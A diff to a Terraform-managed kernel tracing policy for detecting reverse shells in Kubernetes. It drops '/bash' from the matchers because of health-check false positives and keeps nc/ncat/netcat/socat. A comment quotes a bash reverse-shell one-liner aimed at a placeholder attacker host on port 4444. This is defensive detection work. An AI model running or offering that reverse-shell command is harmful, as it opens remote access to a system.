@@ -89,7 +89,28 @@ resource "kubectl_manifest" "tracing_reverse_shell" {
       kprobes = [{
         call    = "security_bprm_check"
         syscall = false
-        args = [{ index = 0, type = "linux_binprm" }]
+        args    = [{ index = 0, type = "linux_binprm" }]
+        # 2026-05-10 v2: REMOVED `/bash` from the matcher list.
+        #
+        # Original policy included `/bash` to catch bash-based reverse-shell
+        # payloads like `bash -i >& /dev/tcp/<attacker>/4444`. But the
+        # `security_bprm_check` kprobe with `linux_binprm` type can only
+        # match the binary path (no argv inspection), so EVERY `/bin/bash`
+        # exec triggered — including Redis-ha health-check probes which
+        # invoke `/bin/bash /health/ping_readiness_local.sh` every few
+        # seconds in each replica.
+        #
+        # Impact: 30,798 events/24h on langgraph-redis-ha-node alone, which
+        # dominated the workload risk score and crowded out real signal.
+        #
+        # nc/ncat/netcat/socat coverage retained — those are the canonical
+        # reverse-shell tools (the bash-based pattern would still trip
+        # detect-sensitive-file-access if it touches /dev/tcp/* and
+        # detect-package-manager-exec if any tooling is installed).
+        #
+        # If bash-based reverse shells become a priority detection target,
+        # author a NEW policy using __x64_sys_execve (which exposes argv)
+        # filtered on `-i` + redirects to network destinations.
         selectors = [{
           matchArgs = [{
             index    = 0
@@ -99,11 +120,8 @@ resource "kubectl_manifest" "tracing_reverse_shell" {
               "/ncat",
               "/netcat",
               "/socat",
-              "/bash", # only if invoked with -i (interactive); see selector below
             ]
           }]
-          # Only fire on /bash if it has -i (interactive shell)
-          # — distinguishes reverse-shell pattern from normal /bin/bash scripts.
           matchActions = [{ action = "Post" }]
         }]
       }]
